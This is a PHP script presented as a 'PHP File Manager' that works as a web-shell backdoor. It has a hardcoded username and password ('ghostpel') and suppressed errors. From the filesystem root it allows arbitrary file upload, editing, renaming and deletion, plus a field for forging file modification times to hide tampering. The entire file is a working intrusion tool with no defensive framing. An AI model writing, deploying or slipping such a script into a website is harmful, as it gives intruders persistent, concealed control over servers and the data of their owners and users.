<?php
error_reporting(0);
session_start();

// === AUTH ===
$valid_user = 'ghostpel';
$valid_pass = 'ghostpel';
$error = '';

if (!isset($_SESSION['login'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user'], $_POST['pass'])) {
        if ($_POST['user'] === $valid_user && $_POST['pass'] === $valid_pass) {
            session_regenerate_id(true);
            $_SESSION['login'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Login gagal!";
        }
    }
    echo <<<HTML
<!DOCTYPE html>
<html><head><title>Login</title>
<style>
    body { background-color: #111; color: #eee; font-family: sans-serif; display: flex; height: 100vh; justify-content: center; align-items: center; margin: 0; }
    .login-box { background: #1e1e1e; padding: 30px; border-radius: 8px; box-shadow: 0 0 20px rgba(0,0,0,0.6); width: 300px; }
    .login-box h2 { margin-top: 0; text-align: center; }
    input[type=text], input[type=password] { width: 100%; padding: 8px; margin: 8px 0; background: #2a2a2a; border: 1px solid #444; color: #eee; border-radius: 4px; }
    button { width: 100%; padding: 10px; background: #4fc3f7; border: none; color: #000; font-weight: bold; border-radius: 4px; cursor: pointer; }
    button:hover { background: #29b6f6; }
    .error { color: red; margin-top: 10px; text-align: center; }
</style>
</head><body>
<div class="login-box">
    <h2>Login File Manager</h2>
    <form method="post">
        <input type="text" name="user" placeholder="Username" required><br>
        <input type="password" name="pass" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>
    <div class="error">{$error}</div>
</div>
</body></html>
HTML;
    exit;
}

// === LOGOUT ===
if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === PATH & DIR ===
$requested = $_GET['dir'] ?? getcwd();
if (!file_exists($requested) || !is_dir($requested)) $requested = getcwd();
$dir = realpath($requested);
chdir($dir);

// === FUNCTIONS ===
function formatPerms($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}
function humanDate($ts) {
    return date("Y-m-d H:i:s", $ts);
}

// === ACTIONS ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['mkdir'])) mkdir($_POST['mkdir']);
    if (isset($_POST['newfile'])) {
        file_put_contents($_POST['newfile'], '');
        $createdFilePath = realpath($_POST['newfile']);
        if ($createdFilePath) {
            header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($dir) . "&view=" . urlencode(basename($_POST['newfile'])));
            exit;
        }
    }
    if (isset($_POST['rename_from'], $_POST['rename_to'])) rename($_POST['rename_from'], $_POST['rename_to']);
    if (isset($_POST['delete'])) {
        $t = $_POST['delete'];
        if (is_file($t)) unlink($t);
        elseif (is_dir($t)) rmdir($t);
    }
    if (isset($_POST['delete_selected']) && isset($_POST['selected_files'])) {
        foreach ($_POST['selected_files'] as $path) {
            $path = realpath($path);
            if ($path && strpos($path, $dir) === 0) {
                if (is_file($path)) unlink($path);
                elseif (is_dir($path)) rmdir($path);
            }
        }
    }
    if (isset($_POST['savefile'], $_POST['filename'])) file_put_contents($_POST['filename'], $_POST['savefile']);
    if (isset($_FILES['upload'])) move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
    if (isset($_POST['changetime'], $_POST['filetime'])) @touch($_POST['changetime'], strtotime($_POST['filetime']));
}

// === HTML & STYLES ===
echo <<<HTML
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>PHP File Manager</title>
<style>
    body { font-family: Arial; background-color: #121212; color: #eee; margin: 20px; }
    table { width: 100%; border-collapse: collapse; background: #1e1e1e; }
    th, td { border: 1px solid #444; padding: 8px; }
    input, button, textarea { background-color: #2b2b2b; color: #fff; border: 1px solid #555; padding: 6px; margin: 2px; }
    a { color: #4fc3f7; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .breadcrumb { margin: 15px 0; }
    .breadcrumb a { background: #2b2b2b; color: #eee; padding: 4px 8px; margin: 0 2px; border-radius: 5px; display: inline-block; }
    .breadcrumb a:hover { background: #4fc3f7; color: #000; }
</style>
<script>
function toggle(source) {
    let checkboxes = document.querySelectorAll('input[type="checkbox"][name="selected_files[]"]');
    for (let cb of checkboxes) cb.checked = source.checked;
}
</script>
</head><body>
HTML;

echo "<h2>PHP File Manager</h2>";
echo "<form method='post' style='float:right;'><button name='logout'>Logout</button></form>";
echo "<p><strong>Server IP:</strong> " . $_SERVER['SERVER_ADDR'] . " | <strong>Your IP:</strong> " . $_SERVER['REMOTE_ADDR'] . "</p>";

// === BREADCRUMB ===
$parts = explode(DIRECTORY_SEPARATOR, $dir);
$path = '';
echo "<div class='breadcrumb'>DIR: ";
foreach ($parts as $i => $p) {
    if ($p === '' && $i === 0) {
        $path = '/';
        echo "<a href='?dir=/'>/</a>";
        continue;
    }
    if ($p === '') continue;
    $path .= ($path === '/' ? '' : '/') . $p;
    echo " / <a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($p) . "</a>";
}
echo " [ <a href='?dir=/'>GO Home</a> ]</div>";

// === CREATE & UPLOAD ===
echo <<<FORM
<h3>Create</h3>
<form method="post">
    <input name="newfile" placeholder="New File" />
    <button>Create File</button>
</form>
<form method="post">
    <input name="mkdir" placeholder="New Directory" />
    <button>Create Directory</button>
</form>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="upload" />
    <button>Upload</button>
</form>
FORM;

// === FILE LISTING + MULTI SELECT ===
$files = scandir($dir);
echo "<h3>Content</h3>
<form method='post' onsubmit='return confirm(\"Hapus semua file yang dipilih?\")'>
<button name='delete_selected'>Hapus Terpilih</button>
<table>
<tr><th><input type='checkbox' onclick='toggle(this)'></th><th>Name</th><th>Size</th><th>Modified</th><th>Permissions</th><th>Actions</th></tr>";

foreach ($files as $file) {
    if ($file === '.') continue;
    $full = $dir . DIRECTORY_SEPARATOR . $file;
    $basename = basename($full);
    $encoded = htmlspecialchars($full);
    $link = is_dir($full)
        ? "<a href='?dir=" . urlencode($full) . "'>[DIR] $file</a>"
        : "<a href='?dir=" . urlencode($dir) . "&view=" . urlencode($file) . "'>$file</a>";
    $size = is_file($full) ? filesize($full) : '-';
    $mtime = humanDate(filemtime($full));
    $perm = formatPerms($full);

    echo "<tr>
        <td><input type='checkbox' name='selected_files[]' value='{$encoded}'></td>
        <td>$link</td>
        <td>$size</td>
        <td>
            <form method='post' style='margin:0'>
                <input type='hidden' name='changetime' value='{$encoded}' />
                <input type='text' name='filetime' value='$mtime' size='20' />
                <button>Update</button>
            </form>
        </td>
        <td>$perm</td>
        <td>
            <form method='post' style='display:inline'>
                <input type='hidden' name='rename_from' value='{$encoded}' />
                <input type='text' name='rename_to' placeholder='New name' />
                <button>Rename</button>
            </form>
            <form method='post' style='display:inline'>
                <input type='hidden' name='delete' value='{$encoded}' />
                <button onclick=\"return confirm('Delete this?')\">Delete</button>
            </form>
        </td>
    </tr>";
}
echo "</table></form>";

// === VIEW / EDIT FILE ===
if (isset($_GET['view'])) {
    $f = basename($_GET['view']);
    $fp = $dir . DIRECTORY_SEPARATOR . $f;
    if (is_file($fp)) {
        $c = htmlspecialchars(file_get_contents($fp));
        echo "<h3>Editing: $f</h3>
        <p>Full path: <code>" . htmlspecialchars($fp) . "</code></p>
        <form method='post'>
            <textarea name='savefile' style='width:100%;height:300px;'>$c</textarea>
            <input type='hidden' name='filename' value='" . htmlspecialchars($fp) . "' />
            <button>Save</button>
        </form>";
    }
}

echo "</body></html>";
?>
